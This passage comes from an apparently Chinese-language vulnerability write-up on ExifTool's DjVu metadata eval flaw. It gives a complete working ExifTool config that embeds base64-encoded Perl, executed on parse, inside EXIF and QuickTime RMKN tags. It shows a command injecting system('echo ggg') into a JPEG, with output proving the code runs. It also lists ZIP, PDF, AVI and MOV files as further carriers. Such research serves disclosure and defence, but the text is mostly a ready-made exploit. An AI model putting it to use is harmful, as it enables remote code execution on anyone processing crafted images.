      |     00f8: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
      |     0108: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
      |     0118: 20 20 20 20                                     [    ]
      | | Metadata (SubDirectory) -->
      | | + [Metadata directory with 1 entries]
      | | | Author = Thu  6 May 2021 21:06:17 AEST.
很好！现在可以从一个有效的TIF中触发`PAYLOAD`了，更重要的是，EXIF数据被用于许多其他格式：
    EXIF stands for "Exchangeable Image File Format".  This type of information
    is formatted according to the TIFF specification, and may be found in JPG,
    TIFF, PNG, JP2, PGF, MIFF, HDP, PSP and XCF images, as well as many
    TIFF-based RAW images, and even some AVI and MOV videos.
如果有一个专门用于编辑图像元数据的工具，而不是每次都手动编辑文件，那就太好了。事实证明，ExifTool允许你使用`Image::ExifTool::UserDefined`的配置文件来创建自己的标签表。经过一段时间的试验，我有了下面这个`eval.config`文件：
    %Image::ExifTool::UserDefined = (
        'Image::ExifTool::Exif::Main' => {
            0xc51b => {
                Name => 'eval',
                Binary => 1,
                Writable => 'undef',
                WriteGroup => 'IFD0',
                ValueConvInv => sub {
                    use MIME::Base64;
                    my $val = shift;
                    $encoded = encode_base64($val);
                    my $meta = qq/(metadata(Copyright "\\\n" eq ''; return (eval { use MIME::Base64; eval(decode_base64(q%$encoded%)); });#"))/;
                    my $len = pack "N", length($meta);
                    my $payload = qq/AT&TFORM\x00\x00\x00\x08DJVUANTa$len$meta/;
                    return $payload;
                }
            }
        }
    )
这能让我们在任何exiftool可以写入EXIF标签的格式（如jpg、tif、png）中添加`HasselbladExif`：
    $ exiftool -config eval.config image.jpg -eval='system("echo ggg")'
    $ exiftool image.jpg
    $ exiftool image.jpg
    ggg
    ExifTool Version Number         : 11.85
    File Name                       : image.jpg
    Directory                       : .
    File Size                       : 11 kB
## 惊喜格式
任何使用标签表`Image::ExifTool::Exif::Main`，调用`ExtractInfo`，`ProcessTIFF`，`ProcessExif`或处理任何容易被攻击的格式时，很可能也能被利用。一个不完整的列表如下：
  * ZIP - [lib/Image/ExifTool/ZIP.pm#L599-L600](https://github.com/exiftool/exiftool/blob/12.23/lib/Image/ExifTool/ZIP.pm#L599-L600 "lib/Image/ExifTool/ZIP.pm#L599-L600")
如果一个ZIP文件包含`meta.json`，那么它将有`ExtractInfo`被调用。
    if ($extract{$file}) {
        ($buff, $status) = $zip->contents($member);
        $status and $et->Warn("Error extracting $file"), next;
        if ($file eq 'meta.json') {
            $et->ExtractInfo(\$buff, { ReEntry => 1 });
            if ($$et{VALUE}{App} and $$et{VALUE}{App} =~ /sketch/i) {
                $et->OverrideFileType('SKETCH');
            }
  * PDF - [lib/Image/ExifTool/PDF.pm#L2071-L2076](https://github.com/exiftool/exiftool/blob/12.23/lib/Image/ExifTool/PDF.pm#L2071-L2076 "lib/Image/ExifTool/PDF.pm#L2071-L2076")  
如果一个PDF文件使用了`DCTDecode`或`JPXDecode`过滤器，那么`ExtractInfo`将被调用。
        if ($filter eq '/DCTDecode' or $filter eq '/JPXDecode') {
      DecodeStream($et, $dict) or last;
      # save the image itself
      $et->FoundTag($tagInfo, \$$dict{_stream});
      # extract information from embedded image
      $result = $et->ExtractInfo(\$$dict{_stream}, { ReEntry => 1 });
  * AVI - [lib/Image/ExifTool/RIFF.pm#L497-L503](https://github.com/exiftool/exiftool/blob/12.23/lib/Image/ExifTool/RIFF.pm#L497-L503 "lib/Image/ExifTool/RIFF.pm#L497-L503")  
EXIF标签将被作为tiff处理。ExifTool不支持向AVI写入，但AVI中用于对齐的一个`JUNK`标签可以直接用EXIF和tiff/exif有效载荷代替。
        EXIF => [{ # (WebP)
          Name => 'EXIF',
          Condition => '$$valPt =~ /^(II\x2a\0|MM\0\x2a)/',
          Notes => 'WebP files',
          SubDirectory => {
              TagTable => 'Image::ExifTool::Exif::Main',
              ProcessProc => \&Image::ExifTool::ProcessTIFF,
  * MOV/MP4 - [lib/Image/ExifTool/QuickTime.pm#L2128-L2132](https://github.com/exiftool/exiftool/blob/12.23/lib/Image/ExifTool/QuickTime.pm#L2128-L2132 "lib/Image/ExifTool/QuickTime.pm#L2128-L2132")  
`UserData`标签`RMKN`将被处理为tiff，然后将其exif数据进行解析。
    RMKN => { #PH (GR)
            Name => 'RicohRMKN',
            SubDirectory => {
                TagTable => 'Image::ExifTool::Exif::Main',
                ProcessProc => \&Image::ExifTool::ProcessTIFF, # (because ProcessMOV is default)
之前的配置文件可以被修改，以增加对该标签的写入支持:
    use MIME::Base64;
    sub GetDjVu {
        my ($val) = @_;
        $encoded = encode_base64($val);
        my $meta = qq/(metadata(Copyright "\\\n" eq ''; return (eval { use MIME::Base64; eval(decode_base64(q%$encoded%)); });#"))/;
        my $len = pack "N", length($meta);
        my $payload = qq/AT&TFORM\x00\x00\x00\x08DJVUANTa$len$meta/;
        return $payload;
    }
    sub GetTiff {
        my ($val) = @_;
        my $payload = GetDjVu($val);
        my $len = pack "N", length($payload) + 1;
        my $tif =
            "MM\x00*\x00\x00\x00\x08\x00\x05\x01\x1a\x00\x05\x00\x00\x00\x01\x00\x00\x00J\x01\x1b\x00\x05\x00\x00\x00\x01\x00" .
            "\x00\x00R\x01(\x00\x03\x00\x00\x00\x01\x00\x03\x00\x00\x02\x13\x00\x03\x00\x00\x00\x01\x00\x01\x00\x00\xc5\x1b\x00\x07" .
            "$len\x00\x00\x00Z\x00\x00\x00\x00\x00\x00\x00%\x00\x00\x00\x01\x00\x00\x00%\x00\x00\x00\x01" .
            "$payload\x00";
        return $tif;
    }
    %Image::ExifTool::UserDefined = (
        'Image::ExifTool::Exif::Main' => {
            0xc51b => {
                Name => 'eval',
                Binary => 1,
                Writable => 'undef',
                WriteGroup => 'IFD0',
                ValueConvInv => sub {
                    return GetDjVu(shift);
                }
            }
        },
        'Image::ExifTool::QuickTime::UserData' => {
            'RMKN' => {
                Name => 'eval',
                Binary => 1,
                Writable => 'undef',
                ValueConvInv => sub {
                    return GetTiff(shift);
                }
            }
        }
    )